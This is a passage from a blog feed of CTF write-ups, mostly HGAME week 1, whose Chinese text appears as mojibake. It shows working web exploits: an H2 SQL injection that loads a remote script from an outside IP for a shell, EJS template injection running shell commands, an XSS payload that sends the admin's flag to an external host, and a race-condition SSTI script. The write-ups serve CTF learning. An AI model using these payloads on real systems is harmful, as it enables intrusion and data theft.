port</code>å¼€å¯æœåŠ¡</p><p>sqlä»€ä¹ˆä¹Ÿæ²¡è¿‡æ»¤ç›´æ¥å†™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; from link_schema(&#x27;</span>TEST2<span class="hljs-string">&#x27;, &#x27;&#x27;, concat(&#x27;</span>jdbc:h2:mem:testdb1;TRACE_LEVEL_SYSTEM_OUT<span class="hljs-operator">=</span><span class="hljs-number">3</span>;<span class="hljs-keyword">IN</span><span class="hljs-string">&#x27;,&#x27;</span>IT<span class="hljs-operator">=</span>RUNSC<span class="hljs-string">&#x27;,&#x27;</span>RIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">8.138</span><span class="hljs-number">.181</span><span class="hljs-number">.58</span>:<span class="hljs-number">32771</span><span class="hljs-operator">/</span><span class="hljs-number">1.</span><span class="hljs-keyword">sql</span><span class="hljs-string">&#x27;&#x27;&#x27;), &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>PUBLIC<span class="hljs-string">&#x27;);--</span><br></code></pre></td></tr></table></figure><p>ç™»å½•æ‹¿åˆ°shell</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210234642888.png" alt="image-20250210234642888"></p><p><code>./readflag</code>æ‹¿åˆ°flag</p><h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1><p>ä¸€é“xssä½†æ˜¯CSPé™åˆ¶åªèƒ½åŠ è½½åŒæºè„šæœ¬ï¼Œå¯¹äºå‰ç«¯ä¸æ˜¯å¾ˆäº†è§£ï¼Œåˆ†æä¸æ˜¯å¾ˆé€å½»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> csp = <span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>æ¯”èµ›</tag>
      
      <tag>zipä¸Šä¼ </tag>
      
      <tag>linuxè¶Šæƒ</tag>
      
      <tag>CVE-2024-2961</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgameweek1</title>
    <link href="/2025/02/07/hgameweek1/"/>
    <url>/2025/02/07/hgameweek1/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a><strong>Pacman</strong></h2><p>ä¸€ä¸ªæ˜¯ä¸€é“jsé€†å‘å§ï¼Œæ²¡æ€ä¹ˆå†™æ˜ç™½ï¼Œæ§åˆ¶è°ƒè¯•åä¿®æ”¹åˆ†æ•°å¤§äº10000ç„¶åæŒ‚äº†å°±è¡Œï¼Œ</p><p>ä½†å…¶å®flagå°±åœ¨ä»£ç é‡Œé¢ï¼Œè™½ç„¶æ··æ·†çš„å¾ˆå‰å®³ä½†æ˜¯ä»£ç åˆ©ç”¨3ä¸ªbase4ï¼Œä¸€ä¸ªä¸ªæ˜¯å°±å‡ºæ¥äº†</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a><strong>BandBomb</strong></h2><p>åˆšå¼€å§‹çœ‹åˆ°ä¸»ç•Œé¢çš„å…¨å›æ˜¾ä»¥ä¸ºæœ‰xssï¼Œæµ‹äº†å¾ˆä¹…å‘ç°æ²¡æœ‰</p><p>å‘ç°æ¯æ¬¡è®¿é—®æ ¹è·¯ç”±éƒ½è¦åŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œè€Œä¸”åœ¨renameè·¯ç”±åˆæœ‰ä»»æ„æ–‡ä»¶è¦†ç›–é‚£å°±è€ƒè™‘è¦†ç›–æ¨¡æ¿æ–‡ä»¶mortis.ejs</p><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªejsæ–‡ä»¶ï¼Œpayload.ejs </p><p>æ–‡ä»¶å†…å®¹ï¼š&lt;%&#x3D; (Function(â€˜return process.mainModule.requireâ€™)())(â€˜child_processâ€™).execSync(â€˜cat &#x2F;proc&#x2F;self&#x2F;environâ€™).toString() %&gt;</p><p>ç„¶åè®¿é—®renameè·¯ç”±å‘é€</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;oldName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload.ejs&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;newName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../views/mortis.ejs&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®ä¸»é¡µå°±èƒ½æ‹¿åˆ°flag</p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a><strong>MysteryMessageBoard</strong></h2><p>é¦–å…ˆè¿›æ¥å¼±å£ä»¤çˆ†ç ´å¾—åˆ°å¯†ç 888888</p><p>ç»™äº†æºç </p><p>æœ‰ä¸ªflagè·¯ç”±ï¼Œä½†æ˜¯éœ€è¦adminè®¿é—®æ‰å¯ä»¥</p><p>è®¿é—®adminè·¯ç”±ä¼šè§¦å‘åœ¨åå°è§¦å‘ä¸€ä¸ªæ— å¤´æµè§ˆå™¨ï¼Œç™»å½•adminè´¦å·è€Œä¸”è®¿é—®indexç•Œé¢</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//æ— å¤´æµè§ˆå™¨æ¨¡æ‹Ÿç™»å½•adminï¼Œå¹¶ä»¥adminèº«ä»½è®¿é—®/è·¯ç”±</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock()<br><span class="hljs-keyword">defer</span> lock.Unlock()<br>ctx, cancel := chromedp.NewContext(context.Background())<br><span class="hljs-keyword">defer</span> cancel()<br>ctx, _ = context.WithTimeout(ctx, <span class="hljs-number">20</span>*time.Second)<br><span class="hljs-keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Chromedp error:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// æ— å¤´æµè§ˆå™¨æ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTasks</span><span class="hljs-params">()</span></span> chromedp.Tasks &#123;<br><span class="hljs-keyword">return</span> chromedp.Tasks&#123;<br>chromedp.Navigate(<span class="hljs-string">&quot;/login&quot;</span>),<br>chromedp.WaitVisible(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>, <span class="hljs-string">&quot;admin&quot;</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;password&quot;]`</span>, <span class="hljs-string">&quot;fake_password&quot;</span>),<br>chromedp.Click(<span class="hljs-string">`input[type=&quot;submit&quot;]`</span>),<br>chromedp.Navigate(<span class="hljs-string">&quot;/&quot;</span>),<br>chromedp.Sleep(<span class="hljs-number">5</span> * time.Second),<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™ä»–æ˜¯adminæƒé™çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥xssfetchå¤–å¸¦å‡ºæ¥ï¼Œæ­å»ºä¸€ä¸ªxsså¹³å°ï¼ˆè¿™é‡Œæˆ‘ä½¿ç”¨è‡ªå·±çš„ï¼‰</p><p>åœ¨é¦–é¡µç•™è¨€</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>()) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;ä½ çš„ç½‘å€?flag=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(flag)); &#125;); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250206155331709.png" alt="image-20250206155331709"></p><h2 id="åŒé¢äººæ´¾å¯¹"><a href="#åŒé¢äººæ´¾å¯¹" class="headerlink" title="åŒé¢äººæ´¾å¯¹"></a><strong>åŒé¢äººæ´¾å¯¹</strong></h2><p>çœ‹ä¸æ‡‚ã€‚ã€‚ã€‚æ¥ä¸ªreå¤§ä½¬å¸¦å¸¦æˆ‘</p><h2 id="è§’è½"><a href="#è§’è½" class="headerlink" title="è§’è½"></a>è§’è½</h2><p>é¦–å…ˆè®¿é—®robots.txt</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/app.conf</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>app<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>fuzzä¸€ä¸‹&#x2F;app&#x2F;å‘ç°ä¸¤ä¸ª</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/app/i</span>ndex<br><span class="hljs-regexp">/app/</span><span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>çœ‹çœ‹<code>/app.conf</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Include by httpd.conf</span><br><span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;</span><br><span class="hljs-attribute">Options</span> Indexes<br><span class="hljs-attribute">AllowOverride</span> None<br><span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<br><span class="hljs-section">&lt;/Directory&gt;</span><br><br><span class="hljs-section">&lt;Files <span class="hljs-string">&quot;/usr/local/apache2/app/app.py&quot;</span>&gt;</span><br>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span><br>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><br><span class="hljs-section">&lt;/Files&gt;</span><br><br><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><br><span class="hljs-attribute">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-attribute">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€å°±æ˜¯ä»¥&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;appä¸ºæ ¹è·¯å¾„ï¼Œä½†æ˜¯ä¸è®©è®¿é—®app.py</p><p>ä½†æ˜¯å½“**user-agentä¸ºL1nk&#x2F;**å¼€å¤´æ˜¯ä¼šé‡å†™è§„åˆ™æŠŠurlæ”¹å˜,å¸¦UAå¤´å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å– æ˜¯<a href="https://www.aqtd.com/nd.jsp?id=6874">CVE-2024-38474</a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211111656036.png" alt="image-20250211111656036"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211112403913.png" alt="image-20250211112403913"></p><p>è®¿é—®&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py%3fï¼Œuser-agentä¸ºL1nk&#x2F;Chromeå¾—åˆ°app.py</p><p>å¸¦ä¸ªï¼Ÿè®©fileå—æ— æ³•åŒ¹é…ï¼ˆ<code>?</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œç”¨äºåˆ†éš”<strong>è·¯å¾„</strong>å’Œ<strong>æŸ¥è¯¢å‚æ•°</strong>ï¼‰</p><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br><span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>status = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(message) <br>f.close()<br><br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>å‘ç°åœ¨é¦–é¡µå†™çš„éƒ½ä¼šå­˜æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå½“æˆ‘ä»¬è®¿é—®readè·¯ç”±æ—¶éƒ½ä¼šè¯»å–æœ€æ–°ä¸€æ¡è¿˜ä¼šæ£€æµ‹å­˜åœ¨<code>&#123;</code>å— ä½†æ˜¯æ–‡ä»¶ä¸€ç›´å¯ä»¥å†™å…¥</p><p>é‚£ä¹ˆæˆ‘ä»¬å¤§é‡çš„å†™å…¥åŒæ—¶å¤§é‡è®¿é—®ç†è®ºä¸Šå¯ä»¥åœ¨æ‰§è¡Œread_messageï¼ˆï¼‰çš„ifåˆ¤æ–­æ—¶æ˜¯æ­£å¸¸çš„ä¿¡æ¯ï¼Œè€Œåœ¨æ¸²æŸ“æ—¶æ˜¯sstiä»£ç å°±å¯ä»¥æ‹¿åˆ°shell</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>TARGET = <span class="hljs-string">&quot;http://node1.hgame.vidar.club:30288/app&quot;</span><br><br>MALICIOUS_PAYLOAD = <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_benign</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;benign&quot;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_benign error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_malicious</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: MALICIOUS_PAYLOAD&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_malicious error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_read</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/read&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        r = session.get(url, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trigger_read error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt</span>():<br>    set_benign()<br><br>    t = threading.Timer(<span class="hljs-number">0.01</span>, set_malicious)<br>    t.start()<br><br>    time.sleep(<span class="hljs-number">0.005</span>)<br><br>    result = trigger_read()<br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¼€å§‹å°è¯•è§¦å‘æ¡ä»¶ç«äº‰æ¼æ´ä»¥è·å¾— flag ...&quot;</span>)<br>    attempt_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        attempt_count += <span class="hljs-number">1</span><br>        result = attempt()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;hgame&#123;&quot;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¯èƒ½æˆåŠŸè·å¾— flagï¼š&quot;</span>)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> attempt_count % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å°è¯•æ¬¡æ•°ï¼š<span class="hljs-subst">&#123;attempt_count&#125;</span>, æœ€è¿‘è¿”å›å†…å®¹ï¼ˆå‰100å­—ç¬¦ï¼‰ï¼š<span class="hljs-subst">&#123;result[:<span class="hljs-number">100</span>]&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a><strong>Compress dot new</strong></h2><p>dsç›´æ¥å—–äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># è¯»å–enc.txtæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-number">1</span>)<br>    json_tree = content[<span class="hljs-number">0</span>]<br>    encoded_bits = content[<span class="hljs-number">1</span>].strip()<br><br><span class="hljs-comment"># è§£æJSONæ ‘ç»“æ„</span><br>huffman_tree = json.loads(json_tree)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_huffman</span>(<span class="hljs-params">tree, bit_str</span>):<br>    result = []<br>    current_node = tree<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bit_str:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;a&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;b&#x27;</span>]<br><br>        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦ä¸ºå¶å­èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">in</span> current_node:<br>            char_code = current_node[<span class="hljs-string">&#x27;s&#x27;</span>]<br>            result.append(char_code)<br>            current_node = tree  <span class="hljs-comment"># é‡ç½®åˆ°æ ¹èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-comment"># è§£ç å¹¶è¾“å‡ºç»“æœ</span><br>decoded_bytes = decode_huffman(huffman_tree, encoded_bits)<br><span class="hljs-built_in">print</span>(decoded_bytes.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>flag: hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</strong></p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>æ¯”èµ›</tag>
      
      <tag>æ¡ä»¶ç«äº‰</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸</title>
    <link href="/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
